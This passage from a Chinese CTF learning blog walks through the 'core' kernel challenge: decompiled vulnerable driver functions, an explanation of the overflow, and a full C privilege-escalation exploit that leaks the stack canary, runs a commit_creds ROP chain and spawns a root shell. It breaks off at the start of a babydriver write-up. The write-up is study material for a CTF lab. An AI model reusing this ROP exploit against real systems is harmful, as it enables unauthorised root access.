<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">core_copy_func</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD v2[<span class="number">10</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2[<span class="number">8</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2A1);</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">    qmemcpy(v2, &amp;name, (<span class="keyword">unsigned</span> __int16)a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>把全局变量name拷贝a1个字节到v2,a1可以整数溢出，所以可以栈溢出了。</p>
<p><strong>core_write</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">core_write</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">unsigned</span> __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_writen&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(name, a2, v3) )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3;</span><br><span class="line">  printk(<span class="string">&quot;\x016core: error copying data from userspacen&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFF2</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以向name copy很多的字节</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>思路：先设置off的值，然后通过core_read()函数leak出canary，然后通过core_write函数向name写rop,然后通过coe_copy_func函数把rop给copy到栈上执行rop。</p>
<p>这是我的大致思路（完全借鉴），至于rop怎么构造怎么提权，怎么返回用户态执行system(‘/bin/sh’)函数都还大致不清楚，等我慢慢钻研。</p>
<p>这是我复刻的脚本，和wiki上的查重率应该能超过百分之70，但好在是自己一个一个字符敲的，在写（抄）的过程中也知道很理解了很多东西，也不得不感叹c语言的强大（指针和内存控制）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]----getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">find_symbols</span><span class="params">()</span></span>&#123;</span><br><span class="line">    FILE* kallsyms_fd=fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]opne kallsyms error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span> (fgets(buf,<span class="number">0x30</span>,kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds&amp;prepare_kernel_cred)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;commit_creds&quot;</span>)&amp;&amp;!commit_creds)&#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds_addr:%p\n&quot;</span>,commit_creds);</span><br><span class="line">            vmlinux_base=commit_creds<span class="number">-0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base_addr:%p&quot;</span>,vmlinux_base);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;prepare_kernel_cred&quot;</span>)&amp;&amp;!prepare_kernel_cred)&#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred_addr:%p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">            vmlinux_base=prepare_kernel_cred<span class="number">-0x9cce0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred&amp;commit_creds))&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]addr error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp,rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has ben saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_off</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">long</span> <span class="keyword">long</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]set off to %ld\n&quot;</span>,idx);</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889c</span>,idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_read</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_copy_func</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">long</span> <span class="keyword">long</span> size)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]copy from user with size :%ld\n&quot;</span>,size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">int</span> fd=open(<span class="string">&quot;/proc/core&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open core error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="keyword">ssize_t</span> offset=vmlinux_base-raw_vmlinux_base;</span><br><span class="line">    set_off(fd,<span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x40</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd,buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary=((<span class="keyword">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]canary: %p\n&quot;</span>,canary);</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        rop[i]=canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)usr_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line">    write(fd,rop,<span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd,<span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>脚本中有很多东西值得思考学习。</p>
<p><strong><strong><strong>asm</strong></strong></strong></p>
<p>这是c语言的内联汇编代码关键字，通过他可以在c语言内执行汇编代码，比如上面这个函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp,rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has ben saved.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后在main函数内调用savestatus函数就能执行这段汇编代码了。不过要注意在编译的时候得加上-masm=intel.我百度了一下发现他们用内联汇编都是__asm{}，像脚本里这样写还是不多，然后他们使用汇编对程序的变量赋值都是采用占位符的方式，脚本里也直接用变量名了，可能是什么另类的方式😃，这段汇编的作用就是记录用户态的信息，等会rop返回用户态的时候用。</p>
<p><strong>find_symbols</strong></p>
<p>通过这个函数打开tmp/kallsyms文件，这个文件记录着内核态的所有符号信息以及对应的地址，当使用命令行打开这个文件是这样的（我随便截的）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ffffffff866dcbf0 t qdisc_lookup_default</span><br><span class="line">ffffffff866dcc40 T __qdisc_calculate_pkt_len</span><br><span class="line">ffffffff866dcca0 t stab_kfree_rcu</span><br><span class="line">ffffffff866dccb0 T qdisc_watchdog_init</span><br><span class="line">ffffffff866dcce0 t qdisc_watchdog</span><br><span class="line">ffffffff866dcd00 T qdisc_watchdog_cancel</span><br><span class="line">ffffffff866dcd10 T qdisc_class_hash_destroy</span><br></pre></td></tr></table></figure>

<p>在脚本里是0x30字符读一次，我他脚本里读的东西输出试试</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ffffffffb6499720 T func_ptr_is_kernel_text</span><br><span class="line"></span><br><span class="line">ffffffffb6499770 t param_array_free</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>是这种输出形式的，应该是每一列都是0x30个字符，所以读的时候fgets(buf,0x30,kakksyms_fd)刚好是读一列，然后查看每一列是否包含<code>commit_creds</code>和<code>prepare_kernel_cred</code>字符串，如果有的话就把前面的地址读出来。</p>
<p><strong>计算地址</strong></p>
<p>计算地址的方式也和用户态不一样，看脚本的时候没看懂，慢慢敲的时候才想明白，在用户态我们一般是求出基地址然后加上偏移量确定地址，求出偏移量的方式类似<code>libc.sym[&#39;__malloc_hook&#39;]</code>（可能libc的逻辑基地址就是0），但使用<code>elf.sym[]</code>求内核某一符号的地址，得到的不是偏移量而是逻辑地址,比如下面</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Python 2.7.12 (default, Mar  1 2021, 11:38:31) </span><br><span class="line">[GCC 5.4.0 20160609] on linux2</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; vmlinux=ELF(<span class="string">&quot;./vmlinux&quot;</span>)</span></span><br><span class="line">[*] &#x27;/home/rootzhang/kernelstudy/pwn2/give_to_player/vmlinux&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    Version:  4.15.8</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0xffffffff81000000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; hex(vmlinux.sym[<span class="string">&quot;commit_creds&quot;</span>])</span></span><br><span class="line">&#x27;0xffffffff8107fc8d&#x27;</span><br></pre></td></tr></table></figure>

<p>所以要算出偏移量的话还得减去vmlinux的逻辑基地址</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; hex(vmlinux.sym[<span class="string">&#x27;commit_creds&#x27;</span>] - 0xffffffff81000000)</span></span><br><span class="line">&#x27;0x9c8e0&#x27;</span><br></pre></td></tr></table></figure>

<p>在利用kallsyms得到commit_creds基地址后减去<code>&#39;0x9c8e0&#39;</code>就是真实的虚拟基地址了，脚本中的0ffset不是gadget的偏移量，而是逻辑基地址和虚拟基地址的差值，再加上gadget的逻辑地址就是这个gadget的虚拟地址了。</p>
<p>寻找gadget的方法如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">把汇编提取出来然后在gadget里面搜索</span></span><br><span class="line">objdump -d vmlinux &gt; gadget</span><br><span class="line"><span class="meta">#</span><span class="bash">我不知道怎么高效搜索，我是这样搜的,搜出来一大堆东西，目前只能肉眼去找</span></span><br><span class="line">grep -E &quot;pop|ret&quot; ./gadget</span><br></pre></td></tr></table></figure>

<p><strong>返回用户态</strong></p>
<p>前面都是小兵，处理完小兵后该屠大龙了。</p>
<p>之前有稍微介绍过如何状态切换，总结起来就是两个指令，一个是<code>swapgs</code>，一个是<code>iretq</code></p>
<p>首先介绍几个重要寄存器</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cs是代码段寄存器</span><br><span class="line">ds是数据段寄存器</span><br><span class="line">ss是堆栈段寄存器</span><br><span class="line">es是扩展段寄存器</span><br><span class="line">fs是标志段寄存器</span><br><span class="line">gs是全局段寄存器</span><br></pre></td></tr></table></figure>

<p><code>swapgs</code>:这个指令是切换GS寄存器的值，内核态或者用户态的GS寄存器的值储存在某个地方，如果要切换的话，就和这个值进行交换。</p>
<p><code>iretq</code>:恢复到用户控件继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）,执行iretq的时候会自动pop出四个值，分别是user_cs,user_rflags,user_sp,user_ss</p>
<p>所以恢复到用户态并执行system(“/bin/sh”)的rop这样构造</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">   rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">   rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">   rop[i++] = (<span class="keyword">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">   rop[i++] = user_cs;</span><br><span class="line">   rop[i++] = user_rflags;</span><br><span class="line">   rop[i++] = user_sp;</span><br><span class="line">   rop[i++] = user_ss;</span><br></pre></td></tr></table></figure>

<p>其中后面pop的值是我们前面通过内联汇编找到的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">     <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">     <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">     <span class="string">&quot;mov user_sp,rsp;&quot;</span></span><br><span class="line">     <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">     <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line"> );</span><br></pre></td></tr></table></figure>

<p>其中pushf就是push状态标志寄存器的值也就是rflags,然后pop接收。</p>
<p><strong>开始调试</strong></p>
<p>调试过程就省略了，不过我终于搞明白这个rop最难理解的地方了，原来call会先把一个地址压栈然后才去执行地址，所以的pop rcx.扫噶，不过有一说一调试内核gdb运行的真的慢。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>今天了解到了很多知识，感觉还不错，哦对最近写知识总结的时候总喜欢听着一首写</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">列车粗糙而过</span><br><span class="line">叫醒我频频失神</span><br><span class="line">---我会在每个有意义的时辰</span><br></pre></td></tr></table></figure>




      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/10/kernel-babydirver/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/02/10/kernel-babydirver/" class="post-title-link" itemprop="url">kernel-babydirver</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-02-10 20:31:37 / 修改时间：20:34:13" itemprop="dateCreated datePublished" datetime="2022-02-10T20:31:37+08:00">2022-02-10</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="kernelpwn入门"><a href="#kernelpwn入门" class="headerlink" title="kernelpwn入门"></a>kernelpwn入门</h1><h2 id="babydriver"><a href="#babydriver" class="headerlink" title="babydriver"></a>babydriver</h2><p>这是ctfwiki上面的第一道例题，首先下载附件，漏洞一般出现在.ko上，.ko文件的装载又在文件系统的init文件中，所以第一步解包文件系统。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mkdir rootfs </span><br><span class="line">mv rootfs.cpio ./rootfs/</span><br><span class="line">cd rootfs</span><br><span class="line">cpio -idmv &lt; rootfs.cpio</span><br><span class="line">cat init</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line">echo -e 